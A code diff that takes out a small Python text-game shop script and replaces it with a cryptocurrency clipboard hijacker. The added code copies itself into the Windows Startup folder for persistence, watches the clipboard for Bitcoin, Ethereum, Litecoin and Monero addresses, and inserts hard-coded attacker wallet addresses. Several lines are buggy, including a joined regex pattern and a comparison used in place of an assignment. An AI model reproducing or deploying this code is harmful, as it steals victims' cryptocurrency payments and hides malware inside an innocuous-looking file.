@@ -1,182 +1,74 @@
-playermoney = 100
-playerinv = ["sword"]
-buy_dict = {
-    "sword": 10,
-    "advanced sword": 15 ,
-    "mega sword": 20,
-    "bow": 15,
-    "sigma gun": 20,
-}
+import re
+import os
+import time
+import shutil
+import random
+import difflib
+
+import tkinter as tk
+
+patterns = [
+    r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$', # bitcoin
+    r'^0x[a-zA-F0-9]{40}$', # Eth
+    r'[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$' # Litecoin
+    r'^4([0-9]|[A-B])(.){93}$' # Monero
+]
+
+btc_address = [
+    'bc1q5llu7khmtshdetdj3k62vzzaaht2la2cpvzkp5',
+]
+
+eth_address = [
+    '0x970f3a2c67A65B4c4AC5DDff0Ee6E4cD3491adF9',
+]
+
+ltc_address = [
+    'LZkbyBpEVMrNAJRrYNxzKxgFywc6sFTCiu',
+]
+
+sol_address = [
+    'Eu94CJ1rjdLSXQHNfj6zRFqn4iuhUvTNpJhP9poXigsh',
+]
 
 
-sell_dict = {
-    "sword": 9,
-    "advanced sword": 12 ,
-    "mega sword": 17,
-    "bow": 14,
-    "sigma gun": 14,
-}
-def shop_my(playermoney,playerinv):
-    print('Hi, welcome to the shop. What do you want to do?')
-    cycleshop = False
-    while cycleshop == False:
-        buysell = input('1-Buy\n2-Sell\n3-Exit\nType here:  ')
-        print('')
-        if buysell == "1":
-            for item, price in buy_dict.items():
-                print(f"{item} : {price} $")
-            print('')
-            print('What do you want to buy?')
-            buy = input('Type:   ').strip().lower()
-            if buy in buy_dict:
-                print('You want to buy',buy,'?')
-                print('')
-                choise = input('1-Yes\n2-No\nType here:  ')
-                if choise == '1':
-                    print('')
-                    print('You have',playermoney,'$')
-                    print("You bought",buy,f"for {buy_dict[buy]}$")
-                    if playermoney >= buy_dict[buy]:
-                        playermoney -= buy_dict[buy]
-                        playerinv.append(buy)
-                        print('Now you have',playerinv,'and',playermoney,'$')
-                        print('')
-                    elif playermoney < buy_dict[buy]:
-                        print('You dont have enough money')
-                elif choise == '2':
-                    print('Do you want to buy or sell something else?')
-                    print('')
+def start_up():
+    user = os.getlogin()
+    basename = os.path.basename(__file__)
+    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+
+
+def clipper():
+    while True:
+        time.sleep(1)
+
+        root = tk.Tk()
+        clipboard = root.clipboard_get()
+        
+        for pattern in patterns:
+            if re.match(pattern, clipboard):
+                index = patterns.index(pattern)
+
+                if index == 0:
+                    address_list = btc_address
+
+                elif index == 1:
+                    address_list = eth_address
+
+                elif index == 2:
+                    address_list == ltc_address
+
+                elif index == 3:
+                    address_list = sol_address
+
+                match_address = difflib.get_close_matches(clipboard, address_list) # Finds a close match
+                if str(match_address) == '[]': # If no close match is found chose a random address
+                    match_address = random.choice(address_list)
+
+                root.clipboard_append(''.join(match_address))
             else:
-                print('Item not found')
-                print('')
-        elif buysell == '2':
-            print('What do you want so you want to sell?')
-            sell = input(f'You have {playerinv}\nType here:  ')
-            if sell in sell_dict and playerinv:
-                print('You want to sell',sell,'?')
-                selltrue = input('1-Yes\n2-No\nType here:  ')
-                if selltrue == '1':
-                    print(f"You sold {sell} for {sell_dict[sell]}$")
-                    playermoney += sell_dict[sell]
-                    playerinv.remove(sell)
-                    print('Now you have',playerinv,'and',playermoney,'$')
-            else:
-                print('You dont have this item!')
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        else:
-            buysell == '3'
-            break
+                pass
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-shop_my(playermoney,playerinv)
-   
+if  __name__  == '__main__':
+    start_up()
+    clipper()
